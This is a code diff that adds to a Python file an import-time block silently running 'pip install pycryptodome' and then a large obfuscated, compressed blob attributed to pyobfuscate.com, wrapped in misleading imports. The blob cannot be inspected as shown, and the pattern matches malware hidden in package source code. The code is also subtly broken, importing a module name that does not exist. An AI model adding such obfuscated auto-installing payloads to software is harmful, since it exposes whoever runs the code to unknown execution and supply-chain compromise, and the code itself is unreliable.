@@ -1,3 +1,20 @@
+import importlib
+
+try:
+
+    importlib.import_module('pycryptodome')
+
+except ImportError:
+
+    print("pycryptodome is not found. Installing...")
+
+    import os
+
+    os.system('pip install pycryptodome')
+
+# Rest of your code goes here...
+
+
 import pycryptodome, random ,base64,codecs,zlib;pyobfuscate=""
 
 obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(public_key)'],['''DV_xD4`?{pN{t@K5GQ{3Qj|1k8V-Ez&z6$01ZRDVV&_YEN8bo62j<*9&YbZ7kMb@RgXduu^om?_j<`-H91lV>JU4(4%S$~r61>`i&yiWEtD|?Y@B{W)t0iySN%mRG!4=%8Wo6x<x||Ix!#hPO2V4*eaYR={>A>NHg<TD4cU{!<x1)=MW4(e813k;kI<~0PcSYxSV-NBM>B(t88i#**8K%T~V&oo8OUAweU~kThe9vm8mi7tQ8>b@F!8_~Y6X09%OuFa<l+FBX-Rbw=hBUmgm&;=V;{@;_7yyIPh$9Q}t7l)%5Qa5z^zmt|0-!2i)w)TJcPZCV_GR1q(4*tTIfWeJ87LO?-$E3L+jxj8JUhJtxO|vbvj`>+4v<0ynIiMAp`3eOY(^q~Lso>_?6yW6ZvRywy>n*_P59#=z3dJ+!61!6U^eqZO4}$@hw~Avz8Hnk1yG&9Uza2?rr0s(_}9k098lP$0#4lK>JE5h>y9)xDVF`cB!$$ybonvt{&>!rj_*(}0*h72z~~PaZpFP*&GEweucmRhjn+kNy3Yr1ezdQ<HCm{Y!X^)d?s?^R>BkvzdUc_;NY3`{E`y{IP2<BSc25Cqk0K8+C(x&J5WH07A=e4bJY9+Rk3==mqdDkRLnQ}s18mgO>~98iovg*z$3}BGZ^Wp+u@1Mk*Enol;&J<?-!FU%F@98W$w)y_d{oojHMd6ViAQVzNA&U7o16VJo!|G8vAoMm=-!-kf7H)!`{T-pfPZ~9oN13x4w7;^eQiF#=$j$S*74Vzm^{OIvvf$Z$HbWOzpu*!&Nr;sR!q{=Ki@<;e%2!gffSB(Ac-)QbXLv)GVJ0pbvQ_Z3mpG<LHriW?_2Lj$5cixJ_C!TVIxXD3N0?>O33axk-as*3Fq`*c?C0>nSD=-7C%jhS=6mBWTn{77S9ZEt9^-dA9(ZWyj#wWfUVoh?d*7~agrAV*M`?}4t+9fL5%4nfijhlx?sx^!a6;yD*zHC?FNJkl5Xfok8DDOHiC{&_{K8c;EiR0Y4`?Y-bxY2E~E8RmMinTBtZ<iry^%sgQlj>dLk6An@pA3cZT#8w#y=U6=M7Wg{E$@i))&?!(r4QHbwKn2iviTgi74K-)qvz`(xW!%`OO$fWPp~#lCEf`065eyYa3zVmTHur;Le-MuXPS>KNYKp?AUpbgL^uD$F-dPD}}0?v9h^PH+S3&>lqeC$9SS87;Q0g*8uE=_pBn-{lDq9V!0^ucP2JTWuYLoK(CRM#t7(@MN=psk{sN$=GI)nv#dG`Ry(l2Tc<LqFFjy1lR*dkj2P9_4y{YKAOq?n!w8Ck%eIaU8#Xw{#&a`)XCBOanE3*&U;#~9=pCstwd+184h8>-bsOcHvGbr-l7EfDjE-&w_tnb>@2Mce~;BkDhyndx}YX?h~i12QKB1VPaEwxC*|ZM{NNh+yyU`-@g!HU)P=zLMgfN>2cJ^iJS@B3QIk0hT0Oz6{{o&yfbaDJPiRxE=8219BNr+gyo!$dkP7ier<?)756Awqe|W`NsF8lhV8nMJ`Np(XDm4xFR05;Ghm;{EVeye<O1CAaXGSbhn54Nbe*VZ?h3#78hk+N1mtSZ2oDb02o2GxrUY&p+emL68>6rNE{B-wvO(IHN!!&Z&$0oIb6hmGa-Pe{hg1yad+?SPjFG#n27ITd-DzUp3-eDm;0@^;q<TS0NY0-ecyd}eZ+)+~JR3OdHqD(<505!*|McL%|F)f^Kf;qRO<mRgX=^yP^MRz1&U0-PNIKUraw4{<O-(B|PQ`hfDNXluRW#N$v{-gBp3~zFU)#D(+YGPU>qf40G*^UtCxB*Q=4cFKuFuPVZuHHKNV4$Q69$Z<N4$XNUpUUJ93g1O0`vjF=n;k;}C3CYdHW9VfOX0RA2AGg_JWL5PF31WZU&d^wY2P*vzv_b!!dInqL$IXvtpYy(dZQxKQH%j%WdC8Ny-*RnBXIk>XzwJjrhlh=15b09TIjuOAZ+clvXmO@!dqXF^a!&Th?>TfqFNm=I5aVE0hEOW?V*|zj(gY!kLh$>g)3vv*3iqRbO4z3b87u6d^Ws*y{Cn19MF-FD6fR{!gr@gFrT8Bx@-$4tBOuT18wbcU2h3?03x~zyhqDL9ChwwFoOXoMq|%xGM)6)V1dHg?wqwIJv!Fj=47Gbl`kx)WaW|'''.replace('\n','')]))
